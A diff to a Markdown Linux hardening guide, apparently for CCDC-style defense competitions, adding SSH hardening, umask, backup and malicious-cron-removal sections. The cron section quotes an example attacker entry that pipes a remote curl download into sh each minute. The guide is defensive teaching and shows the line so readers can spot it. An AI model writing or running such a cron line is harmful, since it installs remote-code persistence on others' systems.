@@ -28,6 +28,8 @@
 		- [tail](#tail)
 		- [grep](#grep)
 		- [alias](#alias)
+- **[Backups](#backups)**
+	-
 - **[Package Management](#package-management)**
 	- [Searching](#searching)
 	- [Updating](#updating)
@@ -48,7 +50,6 @@
 	- [Restarting Services](#restarting-services)
 	- [Stopping Services](#stopping-services)
 - **[Basic Hardening](#basic-hardening)**
-	- [Reducing attack surface](#reducing-attack-surface)
 	- [Auditing](#auditing)
 	- [Fail2Ban](#fail2ban)
 	- [Firewall](#firewall)
@@ -65,6 +66,7 @@
 		- [Changing passwords](#changing-passwords)
 		- [Removing new user accounts](#removing-new-user-accounts)
 		- [Removing ssh keys](#removing-ssh-keys)
+		- [Removing cron jobs](#removing-cron-jobs)
 	- [Finding out what happened](#finding-out-what-happened)
 		- [Checking history](#checking-history)
 	- [If worse comes to worst](#if-worse-comes-to-worst)
@@ -296,8 +298,8 @@ alias grep=grep -iP --color
 Keep in mind aliases only last until you log out. If you want them to persist, you will need to add the commands exactly as shown above to the end of a file called `~/.bashrc`
 
 ## Backups
-
-You should keep backups of the following files.
+Your stuff is going to get hacked eventually. When this happens, you want backups of your critical configuration files.
+*todo: finish*
 
 #### Package Management
 If you come from a Windows environment, you most likely install software by downloading an executable from some dodgy website and hoping it doesn't have malware in it.
@@ -592,8 +594,13 @@ An IDS, or Intrusion Detection System, tracks your system for signs of an intrus
 SSH (i.e. Secure Shell) is a way of logging into a system remotely. This is convenient for system administrators who do not have physical access to a machine. This is also convenient for hackers who can destroy everything if they get in. Here are some guidelines for securing it:
 
 1. Open up the `sshd` configuration file at `/etc/ssh/sshd_config` with your favorite text editor.
-2. First and foremost, deny root login by finding the commented line saying `# PermitRootLogin ues` and change it to say `# PermitRootLogin no`
-*todo: ssh key*
+2. First and foremost, deny root login by finding the commented line saying `# PermitRootLogin ues` and change it to say `PermitRootLogin no`
+3. You can change the port by changing `# Port 22` to `Port 19191`. Keep in mind that this is not a very good defense against experienced attackers, as most attackers will assume that these random ports correspond to ssh. If you do this, it might be a better idea to set the port to something predefined like `80` or `443` (assuming you are not using http/https). Setting your ssh port to something typically used by another service might buy you extra time and confuse the attacker.
+4. If you decide to use ssh keys:
+	1. Create an ssh key with `ssh-keygen`. The default of RSA 2048 is secure enough. Make sure you give the key a strong password in the event the key falls into the hands of an attacker.
+	2. Copy the ssh key to the server with `ssh-copy-id user@server`.
+	3. **Keep a backup of both the ssh key and the `~/.ssh/authorized_keys` file.**
+	3. On the server, deny password logins with `PasswordAuthentication no`.
 
 #### sysctl
 `sysctl` (not to be confused with `systemctl`) is a daemon that controls kernel parameters are runtime. These settings are essential for preventing your service from buckling under many kinds of denial of service attacks.
@@ -630,7 +637,7 @@ sudo sysctl -w net.ipv4.conf.default.send_redirects=0
 #### umask
 Umask sets the permissions an application *cannot* create by default. The default value of `022` is too insecure, so change it with
 ```
-umask 177
+umask 077
 ```
 
 ### So you got hacked
@@ -703,6 +710,23 @@ to remove any ssh keys on the computer.
 
 If you do use ssh keys, issue the above command and then restore your old `~/.ssh/authorized_keys` file.
 
+##### Removing cron jobs.
+If your system has `cron` installed, most likely the hacker will have put in a cron job along the lines of
+```
+* * * * * /usr/bin/curl --insecure https://62.62.62.62 | sh
+```
+First, remove any suspicious cron entries with:
+```
+sudo crontab -e
+```
+Then, it's a good idea to deny non-root users from making cron jobs by adding
+```
+root
+```
+to `/etc/cron.allow` using your favorite text editor.
+
+Then, deny other users by erasing the contents of `/etc/cron.deny`
+
 #### Finding out what happened
 
 ##### Checking history
@@ -722,4 +746,4 @@ sudo restart
 In some CCDC competitions this will revert your box to how it was originally. Keep in mind attackers will still be trying to attack it.
 
 ##### Pulling the plug
-Just like your kids, when things are fukt, you pull the plug. This will stop the bleeding and give you time to cool down and patch security holes. Revisit [Stopping Services](#stopping-services).
+Just like with your kids, when things are fukt, you pull the plug. This will stop the bleeding and give you time to cool down and patch security holes. Revisit [Stopping Services](#stopping-services).
